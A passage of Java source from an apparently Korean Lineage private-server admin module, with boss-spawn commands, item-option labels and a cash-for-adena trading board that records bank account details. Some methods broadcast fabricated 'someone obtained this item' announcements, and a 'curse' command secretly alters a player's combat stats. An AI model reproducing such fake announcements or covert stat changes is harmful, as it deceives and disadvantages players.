		SC_ChatPacket.broadcastMessage("\\fH누군가가 " + item.getName() + " 합성에 성공 하였습니다.");
	}

	private void doice(L1PcInstance gm) { // 얼녀작업
		L1ItemInstance item = null;
		item = ItemTable.getInstance().createItem(3000352);
		SC_PacketBox.broadcastGreen("누군가가 " + item.getName() + " 합성에 성공 하였습니다.");
		SC_ChatPacket.broadcastMessage("\\fH누군가가 " + item.getName() + " 합성에 성공 하였습니다.");
	}

	private void Stone(L1PcInstance gm) { // 룬스톤 카배
		L1ItemInstance item = null;
		item = ItemTable.getInstance().createItem(41148);
		SC_PacketBox.broadcastGreen("누군가가 빛나는 룬스톤에서 " + item.getName() + " 를(을) 획득하였습니다.");
		SC_SystemMessage.broadcast("누군가가 빛나는 룬스톤에서 (" + item.getName() + ") 를(을) 획득하였습니다.");
	}

	private void Stone1(L1PcInstance gm) { // 룬스톤 디스
		L1ItemInstance item = null;
		item = ItemTable.getInstance().createItem(40222);
		SC_PacketBox.broadcastGreen("누군가가 빛나는 룬스톤에서 " + item.getName() + " 를(을) 획득하였습니다.");
		SC_SystemMessage.broadcast("누군가가 빛나는 룬스톤에서 (" + item.getName() + ") 를(을) 획득하였습니다.");
	}

	private void Stone2(L1PcInstance gm) { // 룬스톤 데페
		L1ItemInstance item = null;
		item = ItemTable.getInstance().createItem(210125);
		SC_PacketBox.broadcastGreen("누군가가 빛나는 룬스톤에서 " + item.getName() + " 를(을) 획득하였습니다.");
		SC_SystemMessage.broadcast("누군가가 빛나는 룬스톤에서 (" + item.getName() + ") 를(을) 획득하였습니다.");
	}

	private void Stone3(L1PcInstance gm) { // 룬스톤 아머
		L1ItemInstance item = null;
		item = ItemTable.getInstance().createItem(5559);
		SC_PacketBox.broadcastGreen("누군가가 빛나는 룬스톤에서 " + item.getName() + " 를(을) 획득하였습니다.");
		SC_SystemMessage.broadcast("누군가가 빛나는 룬스톤에서 (" + item.getName() + ") 를(을) 획득하였습니다.");
	}

	private void addEventBoss(L1PcInstance gm, String param) {
		// TODO 자동 생성된 메소드 스텁
		try {
			StringTokenizer st = new StringTokenizer(param);
			String BossName = st.nextToken();
			if (BossName.equalsIgnoreCase("커츠")) {
				L1SpawnUtil.spawn2(32854, 33261, (short) 4, 45600, 0, 3600 * 1000, 0);
				L1SpawnUtil.spawn2(32854, 33262, (short) 4, 50000059, 3, 3600 * 1000, 0);
				L1SpawnUtil.spawn2(32854, 33262, (short) 4, 50000059, 3, 3600 * 1000, 0);
				L1SpawnUtil.spawn2(32854, 33262, (short) 4, 50000059, 3, 3600 * 1000, 0);
				L1SpawnUtil.spawn2(32854, 33262, (short) 4, 50000059, 3, 3600 * 1000, 0);
				L1World.getInstance().broadcastServerMessage("\\aH[이벤트 보스(1/6)]:돌격! 커츠의 부대가 소환 되었습니다. (장소: 사막 아슈르)");
				SC_PacketBox.broadcastGreen("\\fR[이벤트 보스(1/6)]:돌격! 커츠의 부대가 소환 되었습니다 (장소: 사막 아슈르)");
			} else if (BossName.equalsIgnoreCase("데스나이트")) {
				L1SpawnUtil.spawn2(32856, 33263, (short) 4, 45601, 0, 3600 * 1000, 0);
				L1World.getInstance().broadcastServerMessage("\\aH[이벤트 보스(2/6)]:돌격! 데스나이트의 부대가 소환 되었습니다. (장소: 사막 아슈르)");
				SC_PacketBox.broadcastGreen("\\fR[이벤트 보스(2/6)]:돌격! 데스나이트의 부대가 소환 되었습니다 (장소: 사막 아슈르)");
			} else if (BossName.equalsIgnoreCase("피닉스")) {
				L1SpawnUtil.spawn2(32853, 33265, (short) 4, 45617, 50, 3600 * 1000, 0);
				L1World.getInstance().broadcastServerMessage("\\aH[이벤트 보스(3/6)]:돌격! 피닉스의 부대가 소환 되었습니다. (장소: 사막 아슈르)");
				SC_PacketBox.broadcastGreen("\\fR[이벤트 보스(3/6)]:돌격! 피닉스의 부대가 소환 되었습니다 (장소: 사막 아슈르)");
			} else if (BossName.equalsIgnoreCase("마령군왕라이아")) {
				L1SpawnUtil.spawn2(32854, 33259, (short) 4, 45863, 0, 3600 * 1000, 0);
				L1World.getInstance().broadcastServerMessage("\\aH[이벤트 보스(4/6)]:돌격! 마령군왕 라이아의 부대가 소환 되었습니다. (장소: 사막 아슈르)");
				SC_PacketBox.broadcastGreen("\\fR[이벤트 보스(4/6)]:돌격! 마령군왕 라이아의 부대가 소환 되었습니다 (장소: 사막 아슈르)");
			} else if (BossName.equalsIgnoreCase("사신그림리퍼")) {
				L1SpawnUtil.spawn2(32854, 33266, (short) 4, 7310077, 0, 3600 * 1000, 0);
				L1World.getInstance().broadcastServerMessage("\\aH[이벤트 보스(5/6)]:돌격! 사신 그림리퍼의 부대가 소환 되었습니다. (장소: 사막 아슈르)");
				SC_PacketBox.broadcastGreen("\\fR[이벤트 보스(5/6)]:돌격! 사신 그림리퍼의 부대가 소환 되었습니다 (장소: 사막 아슈르)");
			} else if (BossName.equalsIgnoreCase("공포의안타라스")) {
				L1SpawnUtil.spawn2(32848, 33260, (short) 4, 7310154, 0, 3600 * 1000, 0);
				L1World.getInstance().broadcastServerMessage("\\aH[이벤트 보스(6/6)]:돌격! 마지막 몬스터가 소환 되었습니다. (장소: 사막 아슈르)");
				SC_PacketBox.broadcastGreen("\\fR[이벤트 보스(6/6)]:돌격! 마지막 몬스터가 소환 되었습니다. (장소: 사막 아슈르)");
			}
		} catch (Exception e) {
			SC_SystemMessage.send(gm, ".보스 [보스이름] ex<커츠/데스나이트/피닉스/마령군왕라이아/사신그림리퍼/공포의안타라스");
		}
	}

	/*
	 * private void setMaxLevel(L1PcInstance gm, String param){ try{ String[]
	 * arr = param.split(" "); if(arr[0].equalsIgnoreCase("설정")){ int i =
	 * Integer.parseInt(arr[1]); Config.MAX_LEVEL = i; Config.MAX_LEVEL_EXP =
	 * ExpTable.getExpByLevel(i) + 5; }else if(arr[0].equalsIgnoreCase("확인")){
	 * }else throw new Exception(); gm.sendPackets(String.format(
	 * "현재 설정된 최대 레벨 : %d(exp : %d)", Config.MAX_LEVEL, Config.MAX_LEVEL_EXP)));
	 * }catch(Exception e){ gm.sendPackets(".최대레벨 [확인]")); gm.sendPackets(
	 * ".최대레벨 [설정] [레벨]")); } }
	 */

	public void setPresentationCode(L1PcInstance gm, String param) {
		try {
			L1ItemInstance.presentationCode = Integer.parseInt(param);
			gm.sendPackets(String.format("표기번호가 %d로 설정되었습니다.", L1ItemInstance.presentationCode));
		} catch (Exception e) {
			gm.sendPackets(String.format(".표기셋팅 숫자"));
		}
	}

	public void showObjectList(L1PcInstance gm, String param) {
		StringBuilder sb = new StringBuilder(256);
		for (L1Object obj : gm.getKnownObjects()) {
			if (obj instanceof L1Character) {
				L1Character c = (L1Character) obj;
				sb.append(c.getName()).append(" ").append(obj.getX()).append(" ").append(obj.getY()).append("\n");
			}
		}

		gm.sendPackets(sb.toString());
	}

	public static void setCharacterInstanceStatus(MJCommandArgs args) {
		try {
			String name = args.nextString();
			int status = args.nextInt();
			L1PcInstance pc = L1World.getInstance().getPlayer(name);
			if (pc == null) {
				args.notify(String.format("캐릭터이름 : %s를 찾을 수 없습니다.", name));
				return;
			}
			MJEPcStatus e_status = MJEPcStatus.fromInt(status);
			if (e_status.equals(MJEPcStatus.NONE)) {
				StringBuilder sb = new StringBuilder(256);
				MJEPcStatus[] statuses = MJEPcStatus.values();
				sb.append("상태 값을 정확히 입력해주세요 ->\r\n");
				for (int i = 0; i < statuses.length; ++i) {
					if (i != 0)
						sb.append(", ");
					sb.append("[").append(statuses[i].toInt()).append(".").append(statuses[i]).append("]");
				}
				args.notify(sb.toString());
				return;
			}
			pc.set_instance_status(e_status);
		} catch (Exception e) {
			args.notify(".캐릭터상태 [캐릭터이름] [상태값]");
		} finally {
			args.dispose();
		}
	}

	private void CurseCharacter(MJCommandArgs args) {
		try {
			String name = args.nextString();
			if (name == null || name.equalsIgnoreCase(""))
				throw new Exception();

			L1PcInstance pc = L1World.getInstance().getPlayer(name);
			if (pc == null) {
				args.notify(String.format("%s을(를) 찾을 수 없습니다.", name));
				return;
			}

			pc.add_lateral_damage(args.nextInt());
			pc.add_lateral_reduction(args.nextInt());
			pc.add_lateral_magic_rate(args.nextInt());
			pc.update_lateral_status();
			args.notify(String.format("%s의 현재 상태 - 대미지:%d, 리덕:%d,마법대미지:%d", name, pc.get_lateral_damage(),
					pc.get_lateral_reduction(), pc.get_lateral_magic_rate()));
		} catch (Exception e) {
			args.notify(".저주 [캐릭터이름] [대미지] [리덕션] [마법대미지]");
		}
	}

	private void CurseInitializeCharacter(MJCommandArgs args) {
		try {
			String command_type = args.nextString();
			if (command_type.equalsIgnoreCase("전체")) {
				L1World.getInstance().getAllPlayerStream().filter((L1PcInstance pc) -> {
					return pc != null;
				}).forEach((L1PcInstance pc) -> {
					pc.set_lateral_damage(0);
					pc.set_lateral_reduction(0);
					pc.set_lateral_magic_rate(0);
				});
				Updator.truncate("tb_lateral_status");
				args.notify("전체 데이터를 초기화했습니다.");
			} else if (command_type.equalsIgnoreCase("캐릭")) {
				String name = args.nextString();
				if (name == null || name.equalsIgnoreCase(""))
					throw new Exception();
				L1PcInstance pc = L1World.getInstance().getPlayer(name);
				if (pc == null) {
					args.notify(String.format("%s을(를) 찾을 수 없습니다.", name));
					return;
				}
				pc.delete_lateral_status();
				args.notify(String.format("%s의 데이터를 초기화했습니다.", name));
			} else {
				throw new Exception();
			}
		} catch (Exception e) {
			args.notify(".저주초기화 [전체] | [캐릭(캐릭 메티스)]");
		}
	}

	private void clanMark(L1PcInstance pc, String param) {
		// TODO 자동 생성된 메소드 스텁
		try {
			StringTokenizer st = new StringTokenizer(param);
			String onoff = st.nextToken();
			if (onoff.equalsIgnoreCase("켬")) {
				SC_MarkSee.send(pc, 2, true);
				SC_MarkSee.send(pc, 0, true);
				pc.sendPackets("혈마크 표기를 시작 합니다.");
			} else if (onoff.equalsIgnoreCase("끔")) {
				SC_MarkSee.send(pc, 2, false);
				SC_MarkSee.send(pc, 1, false);
				pc.sendPackets("혈마크 표기를 종료 합니다.");
			} else {
				SC_SystemMessage.send(pc, ".혈마크 [켬 / 끔]");
				return;
			}
		} catch (Exception e) {
			SC_SystemMessage.send(pc, ".혈마크 [켬 / 끔]");
		}
	}

	// TODO 중개 거래 게시판
	private static void LetterList(L1PcInstance pc, int type, int count) {
		SC_LetterList.sendListAsync(pc, type, count);
	}

	public static void WriteCancle(String buyer, String seller) {
		int nu1 = 949;
		SimpleDateFormat formatter = new SimpleDateFormat("yy/MM/dd", Locale.KOREA);
		Date currentTime = new Date();
		String dTime = formatter.format(currentTime);
		String subject = "구매취소내역";
		String content = "구매자 :" + buyer + "" + "\n\n상대방이 구매를 취소하엿습니다." + "\n입금 대기상태로 바뀝니다.";
		String name = "거래관리자";
		L1PcInstance target = L1World.getInstance().getPlayer(seller);
		LetterTable.getInstance().writeLetter(nu1, dTime, name, seller, 0, subject, content, target, () -> {
            if (target != null && target.getOnlineStatus() != 0) {
			SC_PacketBox.send(target, SC_PacketBox.GREEN_MESSAGE, "구매취소: " + buyer + "님이 구매를 취소 하였습니다.");
			LetterList(target, 0, 20);
			SC_SkillSound.send(target, target.getId(), 1091);
			SC_ServerMessage.send(target, 428);
		}
        });
	}

	public static void WriteComplete(String buyer, int count, String seller) {
		int nu1 = 949;
		SimpleDateFormat formatter = new SimpleDateFormat("yy/MM/dd", Locale.KOREA);
		Date currentTime = new Date();
		String dTime = formatter.format(currentTime);
		String subject = "판매완료내역";
		String content = "아데나 :" + count + "개" + "\n판매자 :" + seller + "" + "\n물품 구매가 완료되었습니다. " + "\n\n반드시 리스타트 후에 "
				+ "\n부가 아이템 창고에서" + "\n아데나를 수령하십시요.";
		String name = "거래관리자";
		L1PcInstance target = L1World.getInstance().getPlayer(buyer);
		LetterTable.getInstance().writeLetter(nu1, dTime, name, buyer, 0, subject, content, target, () -> {
            if (target != null && target.getOnlineStatus() != 0) {
			SC_PacketBox.send(target, SC_PacketBox.GREEN_MESSAGE, "판매완료: 아데나가 '부가아이템창고'로 지급 되었습니다(리스타트후 수령가능)");
			target.killSkillEffectTimer(BUYER_COOLTIME);
			LetterList(target, 0, 20);
			SC_SkillSound.send(target, target.getId(), 1091);
			SC_ServerMessage.send(target, 428);
		}
        });
	}

	public static void WriteBuyLetter(String player, int count, int sellcount, String bankname, String name,
			String number, String sellername, String buyername) {
		int nu1 = 949;
		SimpleDateFormat formatter = new SimpleDateFormat("yy/MM/dd", Locale.KOREA);
		Date currentTime = new Date();
		String dTime = formatter.format(currentTime);
		String subject = "구매 신청 내역";
		String content = "구매 아데나 : " + count + "개." + "\n구매 금액 : " + sellcount + "원. " + "\n은행 : " + bankname + ""
				+ "\n예금주 : " + name + "" + "\n계좌번호 : " + number + "" + "\n판매자 캐릭터 : " + sellername + "" + "\n구매자 캐릭터 : "
				+ buyername + "" + "\n\n판매자는 입금완료후 반드시" + "\n.판매완료 (게시번호) 를 하셔야" + "\n구매자에게 아데나가 지급됩니다."
				+ "\n\n판매자가 악의적으로 판매완료를" + "\n거부할 경우 메티스로 문의." + "\n입금전 반드시 상대방이" + "\n접속중인지 확인후 거래를"
				+ "\n진행해 주시기 바랍니다.";
		String project = "거래관리자";
		L1PcInstance target = L1World.getInstance().getPlayer(player);
		LetterTable.getInstance().writeLetter(nu1, dTime, project, player, 0, subject, content, target, () -> {
            if (target != null && target.getOnlineStatus() != 0) {
			LetterList(target, 0, 20);
			SC_SkillSound.send(target, target.getId(), 1091);
			SC_ServerMessage.send(target, 428);
		}
        });
	}

	public static void WriteSellLetter(String player, int count, int sellcount, String bankname, String name,
			String number, String charname) {
		int nu1 = 949;
		SimpleDateFormat formatter = new SimpleDateFormat("yy/MM/dd", Locale.KOREA);
		Date currentTime = new Date();
		String dTime = formatter.format(currentTime);
		String subject = "판매 등록 내역";
		String content = "판매 아데나 : " + count + "개." + "\n판매 금액 : " + sellcount + "원. " + "\n은행 : " + bankname + ""
				+ "\n예금주 : " + name + "" + "\n계좌번호 : " + number + "" + "\n판매자 캐릭터 : " + charname + ""
				+ "\n\n위 내용과 상이할 경우 " + "\n.판매취소 (게시글번호)" + "\n하신후 재등록 하시기 바랍니다." + "\n\n잘못된 정보 기재로 인한 피해사항은"
				+ "\n어떤한 경우에도 책임지지 않습니다.";
		String project = "거래관리자";
		L1PcInstance target = L1World.getInstance().getPlayer(player);
		LetterTable.getInstance().writeLetter(nu1, dTime, project, player, 0, subject, content, target, () -> {
            if (target != null && target.getOnlineStatus() != 0) {
			LetterList(target, 0, 20);
			SC_SkillSound.send(target, target.getId(), 1091);
			SC_ServerMessage.send(target, 428);
		}
        });
	}

	private static void countR1(L1PcInstance pc, String count) {
		StringTokenizer st = new StringTokenizer(count);
		try {
			int i = 0;
			int sellcount = 0;
			String bankname = null;
			String name = null;
			String numeber = null;
			try {
				i = Integer.parseInt(st.nextToken());
				sellcount = Integer.parseInt(st.nextToken());
				bankname = st.nextToken();
				name = st.nextToken();
				numeber = st.nextToken();
			} catch (NumberFormatException e) {
			}

			if (i <= 0) {
				pc.sendPackets(".판매등록  (판매금액)을 적어주세요.");
				return;
			}
			if (i > Config.MAX_SELL_ADENA) {
				pc.sendPackets("최대판매 아데나는 " + Config.MAX_SELL_ADENA + " 아데나 이상 판매하실 수 없습니다.");
				return;
			}
			if (i >= 1 && i < Config.MIN_SELL_ADENA) {
				pc.sendPackets("최소판매 아데나는 " + Config.MIN_SELL_ADENA + " 아데나 이상 입니다.");
				return;
			}
			if (sellcount < Config.MIN_SELL_CASH) {
				pc.sendPackets("최소판매금액은 " + Config.MIN_SELL_CASH + "원 이상 입니다.");
				return;
			}
			if (sellcount > Config.MAX_SELL_CASH) {
				pc.sendPackets("최대판매금액은 " + Config.MAX_SELL_CASH + "원 이하 입니다.");
				return;
			}

			String selltype = "판매중";
			L1Item temp = ItemTable.getInstance().getTemplate(L1ItemId.ADENA);
			L1ItemInstance adena = new L1ItemInstance(temp, i);

			if (pc.getInventory().checkItem(L1ItemId.ADENA, i)) {
				pc.getInventory().consumeItem(L1ItemId.ADENA, i);
				AuctionSystemTable.getInstance().writeTopic(pc, selltype, adena, i, sellcount, bankname, numeber, name);
				WriteSellLetter(pc.getName(), i, sellcount, bankname, name, numeber, pc.getName());
				//WriteSellLetter("메티스", i, sellcount, bankname, name, numeber, pc.getName());
			} else {
				pc.sendPackets("입력하신 숫자가 소지하신 아데나보다 작습니다.");
			}
		} catch (Exception exception) {
			pc.sendPackets(".판매등록 (아데나) (판매금액) (은행명) (예금주) (계좌)");
			pc.sendPackets(".판매등록 10000000 5000 한국은행 홍길동 123123(-제외)");
		}
	}

	private static void countR2(L1PcInstance pc, String count) {
		if (pc.hasSkillEffect(BUYER_COOLTIME)) {
			int n = pc.getSkillEffectTimeSec(BUYER_COOLTIME);
			pc.sendPackets("이미 다른 물품을 구매중이거나 쿨타임이 적용중입니다.");
			SC_SystemMessage.send(pc, String.format("%d초 후에 구매신청을 하실 수 있습니다.", n));
			return;
		}
		int i = 0;
		Connection con = null;
		PreparedStatement pstm = null;
		ResultSet rs = null;

		try {
			i = Integer.parseInt(count);
		} catch (NumberFormatException e) {
		}
		String charname = null;
		int adenacount = 0;
		int sellcount = 0;
		int status = 0;
		String bank = null;
		String banknumeber = null;
		String bankname = null;
		try {
			con = DatabaseFactory.getInstance().getConnection();
			pstm = con.prepareStatement(
					"SELECT  id, name, count, sellcount, status, bank, banknumber, bankname from Auction where id Like '"
							+ i + "'");
			rs = pstm.executeQuery();
			while (rs.next()) {
				charname = rs.getString("name");
				adenacount = rs.getInt("count");
				sellcount = rs.getInt("sellcount");
				status = rs.getInt("status");
				bank = rs.getString("bank");
				banknumeber = rs.getString("banknumber");
				bankname = rs.getString("bankname");
			}

			if (charname == null) {
				pc.sendPackets("잘못된 게시번호 입니다.");
				return;
			}
			if (status == 1) {
				pc.sendPackets("이미 다른사람이 구매신청을 한 상태입니다.");
				return;
			}
			if (status == 2) {
				pc.sendPackets("이미 판매 완료된 물품입니다.");
				return;
			}

			try {
				int time = 600;
				WriteBuyLetter(pc.getName(), adenacount, sellcount, bank, bankname, banknumeber, charname,
						pc.getName());
				WriteBuyLetter(charname, adenacount, sellcount, bank, bankname, banknumeber, charname, pc.getName());
				//WriteBuyLetter("메티스", adenacount, sellcount, bank, bankname, banknumeber, charname, pc.getName());
				AuctionSystemTable.getInstance().AuctionUpdate(i, pc.getName(), pc.getAccountName(), "입금대기", 1);
				pc.setSkillEffect(BUYER_COOLTIME, time * 1000);
			} catch (Exception e) {
				e.printStackTrace();
			}

		} catch (SQLException e) {
			pc.sendPackets(".구매신청 (게시글번호)");
			pc.sendPackets(".구매신청 0017");
		} finally {
			SQLUtil.close(rs, pstm, con);
		}
	}

	private static void countR3(L1PcInstance pc, String count) {
		int i = 0;
		Connection con = null;
		PreparedStatement pstm = null;
		ResultSet rs = null;
		try {
			i = Integer.parseInt(count);
		} catch (NumberFormatException e) {
		}
		int itemid = 0;
		int itemcount = 0;
		String account = null;
		int status = 0;
		try {
			con = DatabaseFactory.getInstance().getConnection();
			pstm = con.prepareStatement(
					"SELECT  item_id ,count ,AccountName ,status from Auction where id Like '" + i + "'");
			rs = pstm.executeQuery();
			while (rs.next()) {
				itemid = rs.getInt("item_id");
				itemcount = rs.getInt("count");
				account = rs.getString("AccountName");
				status = rs.getInt("status");
			}
			if (status == 1) {
				pc.sendPackets("입금 대기상태 에서는 판매취소가 불가능 합니다.");
				return;
			}
			if (status == 2) {
				pc.sendPackets("판매가 완료된 상태입니다.");
				return;
			}
			if (pc.getAccountName().equalsIgnoreCase(account) || pc.isGm()) {
				pc.getInventory().storeItem(itemid, itemcount);
				AuctionSystemTable.getInstance().deleteTopic(i);
				pc.sendPackets("정상취소 되었습니다");
			} else {
				pc.sendPackets("등록하신 물품이 아닙니다");
			}
		} catch (SQLException e) {
			pc.sendPackets(".판매취소 (게시글번호) 라고 적어주십시요.");
			pc.sendPackets("예)  .판매취소 0035");
		} finally {
			SQLUtil.close(rs, pstm, con);
		}
	}
	private String itemlevel(L1ItemInstance item) {

		String ggg = "";

		switch (item.get_item_level()) {
		case 1:
			ggg = "\\fH일반 [근거리 치명타 +1%]";
			break;
		case 2:
			ggg = "\\fH일반 [원거리 치명타 +1%]";
			break;
		case 3:
			ggg = "\\fH일반 [마법 치명타 +1%]";
			break;
		case 4:
			ggg = "\\fH일반 [근거리 대미지 +1]";
			break;
		case 5:
			ggg = "\\fH일반 [원거리 대미지 +1]";
			break;
		case 6:
			ggg = "\\fH일반 [근거리 명중 +1]";
			break;
		case 7:
			ggg = "\\fH일반 [원거리 명중 +1]";
			break;
		case 8:
			ggg = "\\fH일반 [대미지감소 +1]";
			break;
		case 9:
			ggg = "\\fH일반 [추가 방어력 +1]";
			break;
		case 10:
			ggg = "\\fH일반 [MR +3]]";
			break;
		case 11:
			ggg = "\\fH일반 [최대HP +30]";
			break;
		case 12:
			ggg = "\\fH일반 [최대MP +20]";
			break;
		case 13:
			ggg = "\\fH일반 [PVP추가대미지 +1]";
			break;
		case 14:
			ggg = "\\fH일반 [PVP대미지감소 +1]";
			break;
		case 15:
			ggg = "\\fH일반 [불 속성 저항 +10]";
			break;
		case 16:
			ggg = "\\fH일반 [땅 속성 저항 +10]";
			break;
		case 17:
			ggg = "\\fH일반 [물 속성 저항 +10]";
			break;
		case 18:
			ggg = "\\fH일반 [바람 속성 저항 +10]";
			break;
		case 19:
			ggg = "\\fH일반 [소지무게증가 +100]";
			break;
		case 20:
			ggg = "\\aH고급 [근거리 치명타 +3%]";
			break;
		case 21:
			ggg = "\\aH고급 [원거리 치명타 +3%]";
			break;
		case 22:
			ggg = "\\aH고급 [마법 치명타 +3%]";
			break;
		case 23:
			ggg = "\\aH고급 [근거리 대미지 +3]";
			break;
		case 24:
			ggg = "\\aH고급 [원거리 대미지 +3]";
			break;
		case 25:
			ggg = "\\aH고급 [근거리 명중 +3]";
			break;
		case 26:
			ggg = "\\aH고급 [원거리 명중 +3]";
			break;
		case 27:
			ggg = "\\aH고급 [대미지 감소 +2]";
			break;
		case 28:
			ggg = "\\aH고급 [추가 방어력 +2]";
			break;
		case 29:
			ggg = "\\aH고급 [MR +6]";
			break;
		case 30:
			ggg = "\\aH고급 [최대 HP +60]";
			break;
		case 31:
			ggg = "\\aH고급 [최대 MP +40]";
			break;
		case 32:
			ggg = "\\aH고급 [DG +3]";
			break;
		case 33:
			ggg = "\\aH고급 [HP절대회복 +30(32초)]";
			break;
		case 34:
			ggg = "\\aH고급 [MP절대회복 +10(64초)]";
			break;
		case 35:
			ggg = "\\aH고급 [ER +3]";
			break;
		case 36:
			ggg = "\\aH고급 [PVP추가대미지 +2]";
			break;
		case 37:
			ggg = "\\aH고급 [PVP대미지감소 +2]";
			break;
		case 38:
			ggg = "\\aH고급 [PVP마법대미지감소 +2%]";
			break;
		case 39:
			ggg = "\\aH고급 [내성: 기술 +2]";
			break;
		case 40:
			ggg = "\\aH고급 [내성: 정령 +2]";
			break;
		case 41:
			ggg = "\\aH고급 [내성: 용언 +2]";
			break;
		case 42:
			ggg = "\\aH고급 [내성: 공포 +2]";
			break;
		case 43:
			ggg = "\\aH고급 [불 속성 저항 +20]";
			break;
		case 44:
			ggg = "\\aH고급 [땅 속성 저항 +20]";
			break;
		case 45:
			ggg = "\\aH고급 [물 속성 저항 +20]";
			break;
		case 46:
			ggg = "\\aH고급 [바람 속성 저항 +20]";
			break;
		case 47:
			ggg = "\\aH고급 [STR +1]";
			break;
		case 48:

			ggg = "\\aH고급 [DEX +1]";
			break;
		case 49:
			ggg = "\\aH고급 [CON +1]";
			break;
		case 50:
			ggg = "\\aH고급 [WIS +1]";
			break;
		case 51:
			ggg = "\\aH고급 [INT +1]";
			break;
		case 52:
			ggg = "\\aH고급 [소지 무게 증가 +200]";
			break;
		case 53:
			ggg = "\\aL희귀 [근거리 치명타 +5%]";
			break;
		case 54:
			ggg = "\\aL희귀 [원거리 치명타 +5%]";
			break;
		case 55:
			ggg = "\\aL희귀 [마법 치명타 +5%]";
			break;
		case 56:
			ggg = "\\aL희귀 [근거리 대미지 +3]";
			break;
		case 57:
			ggg = "\\aL희귀 [원거리 대미지 +3]";
			break;
		case 58:
			ggg = "\\aL희귀 [근거리 명중 +3]";
			break;
		case 59:
			ggg = "\\aL희귀 [원거리 명중 +3]";
			break;
		case 60:
			ggg = "\\aL희귀 [SP +3]";
			break;
		case 61:
			ggg = "\\aL희귀 [마법적중 +3]";
			break;
		case 62:
			ggg = "\\aL희귀 [대미지감소 +3]";
			break;
		case 63:
			ggg = "\\aL희귀 [추가 방어력 +3]";
			break;
		case 64:
			ggg = "\\aL희귀 [MR +10]";
			break;
		case 65:
			ggg = "\\aL희귀 [최대 HP +150]";
			break;
		case 66:
			ggg = "\\aL희귀 [최대 MP +100]";
			break;
		case 67:
			ggg = "\\aL희귀 [DG +5]";
			break;
		case 68:
			ggg = "\\aL희귀 [HP절대회복 +50(32초)]";
			break;
		case 69:
			ggg = "\\aL희귀 [MP절대회복 +12(64초)]";
			break;
		case 70:
			ggg = "\\aL희귀 [ER +5]";
			break;
		case 71:
			ggg = "\\aL희귀 [PVP추가대미지 +3]";
			break;
		case 72:
			ggg = "\\aL희귀 [PVP대미지감소 +3]";
			break;
		case 73:
			ggg = "\\aL희귀 [PVP마법대미지감소 +5%]";
			break;
		case 74:
			ggg = "\\aL희귀 [내성: 기술 +5]";
			break;
		case 75:
			ggg = "\\aL희귀 [내성: 정령 +5]";
			break;
		case 76:
			ggg = "\\aL희귀 [내성: 용언 +5]";
			break;
		case 77:
			ggg = "\\aL희귀 [내성: 공포 +5]";
			break;
		case 78:
			ggg = "\\aL희귀 [적중: 기술 +3]";
			break;
		case 79:
			ggg = "\\aL희귀 [적중: 정령 +3]";
			break;
		case 80:
			ggg = "\\aL희귀 [적중: 용언 +3]";
			break;
		case 81:
			ggg = "\\aL희귀 [적중: 공포 +3]";
			break;
		case 82:
			ggg = "\\aL희귀 [불 속성 저항 +30]";
			break;
		case 83:
			ggg = "\\aL희귀 [땅 속성 저항 +30]";
			break;
		case 84:
			ggg = "\\aL희귀 [물 속성 저항 +30]";
			break;
		case 85:
			ggg = "\\aL희귀 [바람 속성 저항 +30]";
			break;
		case 86:
			ggg = "\\aL희귀 [모든 속성 저항 +10]";
			break;
		case 87:
			ggg = "\\aL희귀 [STR +2]";
			break;
		case 88:
			ggg = "\\aL희귀 [DEX +2]";
			break;
		case 89:
			ggg = "\\aL희귀 [CON +2]";
			break;
		case 90:
			ggg = "\\aL희귀 [WIS +2]";
			break;
		case 91:
			ggg = "\\aL희귀 [INT +2]";
			break;
		case 92:
			ggg = "\\aL희귀 [소지무게증가 +300]";
			break;
		case 93:
			ggg = "\\f3영웅 [근거리 대미지 +5]";
			break;
		case 94:
			ggg = "\\f3영웅 [원거리 대미지 +5]";
			break;
		case 95:
			ggg = "\\f3영웅 [근거리 명중 +5]";
			break;

		case 96:
			ggg = "\\f3영웅 [원거리 명중 +5]";
			break;
		case 97:
			ggg = "\\f3영웅 [SP +5]";
			break;
		case 98:
			ggg = "\\f3영웅 [마법적중 +5]";
			break;
		case 99:
			ggg = "\\f3영웅 [대미지감소 +5]";
			break;
		case 100:
			ggg = "\\f3영웅 [추가 AC -5]";
			break;
		case 101:
			ggg = "\\f3영웅 [MR +15]";
			break;
		case 102:
			ggg = "\\f3영웅 [최대 HP +300]";
			break;
		case 103:
			ggg = "\\f3영웅 [최대 MP +200]";
			break;
		case 104:
			ggg = "\\f3영웅 [DG +10]";
			break;
		case 105:
			ggg = "\\f3영웅 [HP절대회복 +30(32초)]";
			break;
		case 106:
			ggg = "\\f3영웅 [MP절대회복 +30(64초)]";
			break;
		case 107:
			ggg = "\\f3영웅 [ER +12]";
			break;
		case 108:
			ggg = "\\f3영웅 [PVP추가대미지 +7]";
			break;
		case 109:
			ggg = "\\f3영웅 [PVP대미지감소 +7]";
			break;
		case 110:
			ggg = "\\f3영웅 [PVP마법대미지감소 +10%]";
			break;
		case 111:
			ggg = "\\f3영웅 [PVP대미지감소무시 +10]";
			break;
		case 112:
			ggg = "\\f3영웅 [내성: 기술 +8]";
			break;
		case 113:
			ggg = "\\f3영웅 [내성: 정령 +8]";
			break;
		case 114:
			ggg = "\\f3영웅 [내성: 용언 +8]";
			break;
		case 115:
			ggg = "\\f3영웅 [내성: 공포 +8]";
			break;
		case 116:
			ggg = "\\f3영웅 [모든 내성: +3]";
			break;
		case 117:
			ggg = "\\f3영웅 [적중: 기술 +8]";
			break;
		case 118:
			ggg = "\\f3영웅 [적중: 정령 +8]";
			break;
		case 119:
			ggg = "\\f3영웅 [적중: 용언 +8]";
			break;
		case 120:
			ggg = "\\f3영웅 [적중: 공포 +8]";
			break;
		case 121:
			ggg = "\\f3영웅 [모든 적중: +3]";
			break;
		case 122:
			ggg = "\\f3영웅 [모든 속성 저항: +30]";
			break;
		case 123:
			ggg = "\\f3영웅 [STR +3]";
			break;
		case 124:
			ggg = "\\f3영웅 [DEX +3]";
			break;
		case 125:
			ggg = "\\f3영웅 [CON +3]";
			break;
		case 126:
			ggg = "\\f3영웅 [WIS +3]";
			break;
		case 127:
			ggg = "\\f3영웅 [INT +3]";
			break;
		case 128:
			ggg = "\\f3영웅 [모든 스탯 +1]";
			break;
		case 129:
			ggg = "\\f3영웅 [MP 흡수]";
			break;
		case 130:
			ggg = "\\f3영웅 [소지무게증가 +500]";
			break;
		case 131:
			ggg = "\\f4전설 [디케이포션 발동]";
			break;
		case 132:
			ggg = "\\f4전설 [PVP대미지감소무시 +40]";
			break;
		case 133:
			ggg = "\\f4전설 [모든 스탯 +3]";
			break;
		case 134:
			ggg = "\\f4전설 [HP 흡수]";
			break;
